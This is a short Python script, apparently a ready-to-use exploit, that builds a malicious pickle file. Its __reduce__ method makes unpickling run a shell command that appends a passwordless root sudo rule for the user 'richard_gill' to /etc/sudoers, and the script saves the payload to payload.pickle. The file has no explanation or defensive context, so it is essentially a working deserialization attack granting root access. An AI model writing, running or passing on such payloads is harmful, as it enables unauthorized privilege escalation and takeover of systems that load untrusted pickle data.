import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("echo 'richard_gill ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",))

payload = pickle.dumps(Exploit())

with open("payload.pickle", "wb") as f:  # Ensure to open in binary write mode
    f.write(payload)
